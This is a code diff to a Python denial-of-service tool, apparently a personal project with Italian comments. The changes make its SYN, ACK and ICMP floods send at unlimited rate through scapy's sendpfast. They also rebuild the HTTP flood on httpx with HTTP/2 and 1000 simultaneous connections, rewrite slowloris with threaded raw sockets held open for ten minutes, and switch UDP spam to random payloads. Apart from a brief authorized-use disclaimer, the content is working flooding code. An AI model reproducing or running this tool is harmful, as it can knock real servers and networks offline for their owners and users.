@@ -1,21 +1,27 @@
 #!/usr/bin/python3
-import aiohttp
+import httpx
 import socket
 import asyncio
 import threading
-from scapy.all import IP  , TCP , send , ICMP
+from scapy.all import IP  , TCP , ICMP ,sendpfast , Ether 
 import time
 import sys
 from rich.console import Console# red -> error , bold red -> fatal error , blue -> neutral , green -> success
 import os
 import pyfiglet
 from functools import wraps
+import random
+import time
+async def aiterator(numero):
+    for i in range(numero):
+        yield i
 def avvertences():
     console=Console()
     console.input('''[bold yellow]\t⚠DISCLAIMER\t
 
 This tool is intended solely for authorized, controlled, and ethical use. Any improper or unauthorized use may lead to serious technical, legal, or operational consequences. The creator of this tool assumes no responsibility for any actions performed with it, nor for any damage, disruption, or misuse resulting from its execution.
 Users are fully responsible for ensuring that:
+
 
     the tool is used only in environments where explicit permission has been granted,
 
@@ -44,21 +50,22 @@ class Dos:
         self.ip=ip
         self.dport=dport
         self.num=num
-    def syn_flood(self):
-        pkt=IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='S')
-        for i in range(int(self.num)):
-            send(pkt , verbose=0)
-    def ack_flood(self):
-        pkt=IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='A')
-        for i in range(int(self.num)):
-            send(pkt , verbose=0)
-    def ping_flood(self):
-        pkt=IP(dst=str(self.ip))/ICMP(type=8) / b"Py_Test" *12
-        for i in range(int(self.num)):
-            send(pkt , verbose=0)
+    @timer
+    def run_syn_flood(self):
+        pkt=Ether()/IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='S')
+        sendpfast(pkt  , mbps=0 , loop=int(self.num))
+    @timer
+    def run_ack_flood(self):
+        pkt=Ether()/IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='A')
+        sendpfast(pkt, mbps=0 , loop=int(self.num))
+    @timer
+    def run_ping_flood(self):
+        message=random._urandom(1024)
+        pkt=Ether()/IP(dst=str(self.ip))/ICMP(type=8) / message 
+        sendpfast(pkt , mbps=0 , loop=int(self.num))
     def UDP_spamming(self):
         if True:#idk
-            message= b"bhxod/0x/b1/nwo/18n/obx1" *12   
+            message=random._urandom(1024)#Genera un sequenza di 1024 byte casuale
             try:
                 sock=socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
                 sock.setblocking(False)
@@ -71,49 +78,32 @@ class Dos:
                 self.console.print(f'[bold red][-]Unknown error: {e}[/bold red]')
             finally:
                 sock.close()
-    async def http_flood(self , session):
+    async def http_flood(self , semaphore , session):
         url=str(self.ip)
-        async with session.get(url)as session:
-            return
-    async def slowloris(self):#The slowloris attack is a DoS(Denial of service) attack that tries to keep alive for a long time some connections for using all server resources
-        self.console.print('[blue][*]Starting SlowLoris...[/blue]')
-        async with aiohttp.ClientSession() as session:
-            url=str(self.ip)
-            tasks=[]
-            for i in range(int(self.num)):
-                conn=session.post(url , data='\r\n')
-                tasks.append(conn)
-            self.console.print('[green][+]Keeping the connections open for 10 minutes![/green]')
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(600)#It manteins the connection open for 10 minutes
-            self.console.print('[green][+]End.[/green]')
-    @timer
-    def run_syn_flood(self):
-        processi=[]
-        for i in range(50):
-            a=threading.Thread(target=self.syn_flood)        
-            processi.append(a)
-            a.start()
-        for i in processi:
-            i.join()
-    @timer
-    def run_ack_flood(self):
-        process=[]
-        for i in range(50):
-            t=threading.Thread(target=self.ack_flood)
-            process.append(t)
+        try:
+            async with semaphore:
+                await session.get(url , timeout=httpx.Timeout(1.0 ,connect=0.5))
+        except:
+            pass
+    def slowloris(self):#The slowloris attack is a DoS(Denial of service) attack that tries to keep alive for a long time some connections for using all server resources
+        try:
+            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(self.ip , self.dport)
+            s.send(b"GET / HTTP/1.1\r\n")
+            s.send(b"Host: " + self.ip.encode() + b"\r\n")
+            s.send(b"User-Agent: Mozilla/5.0\r\n")
+            s.send(b"Connection: keep-alive\r\n")
+            while True:
+                time.sleep(60)
+        except:
+            pass
+    def run_slowloris(self):
+        thread=[]
+        for _ in range(int(self.num)):
+            t=threading.Thread(target=self.slowloris , daemon=True)
+            thread.append(t)
             t.start()
-        for i in process:
-            i.join()
-    @timer
-    def run_ping_flood(self):
-        process=[]
-        for i in range(50):
-            t=threading.Thread(target=self.ping_flood)
-            process.append(t)
-            t.start()
-        for i in process:
-            i.join()
+        time.sleep(600)
     @timer
     def run_UDP_spamming(self):
         process=[]
@@ -124,9 +114,18 @@ class Dos:
         for i in process:
             i.join()
     async def run_http_flood(self):
-        async with aiohttp.ClientSession() as session:
-            tasks=[self.http_flood(session) for _ in range(int(self.num))]
-            await asyncio.gather(*tasks)
+        semaphore=asyncio.Semaphore(1000)#1000 richieste simultanee
+        async with httpx.AsyncClient(
+            limits=httpx.Limits(max_keepalive_connections=0 , max_connections=1000),#Dice di avere massimo 1000 connessioni da mandare e di non tenerne nessuna aperta
+            timeout=httpx.Timeout(1.0 , connect=0.5),
+            http2=True#http2 è per il multiplexing
+            ) as session:
+            try:
+                async for i in aiterator(self.num):
+                    asyncio.create_task(self.http_flood(semaphore , session))
+            except:
+                pass
+        
 async def main():
     console=Console()
     avvertences()
@@ -202,16 +201,16 @@ Select(Ctrl + c for exit)>>'''))
             fine=time.time()
             tempo=fine - inizio
             console.print(f'[green][+]End in {tempo}seconds[/green]')
-        except aiohttp.InvalidURL as e:#Verifica se l'url è invalido
+        except httpx.InvalidURL as e:#Verifica se l'url è invalido
             console.print('[bold red][-]Invalid URL , before the ip/domain put http:// or https://(it depends for the site)[/bold red]')
         except:
             pass
     elif a=='6':
         try:
+            console.print('[blue][*]Starting slowloris , keeping the connections open for 10 minutes...[/blue]')
             dos=Dos(ip, porta, richieste)  
-            await dos.slowloris()
-        except aiohttp.InvalidURL as e:#Verifica se l'url è invalido
-            console.print('[bold red][-]Invalid URL , before the ip/domain put http:// or https://(it depends for the site)[/bold red]')
+            dos.run_slowloris()
+            console.print('[green][+]Done[/green]')
         except:
             pass
     else:
@@ -230,4 +229,3 @@ if __name__=='__main__':
         asyncio.run(main())
     except KeyboardInterrupt:
         sys.exit('\nQuitting...\n')
-
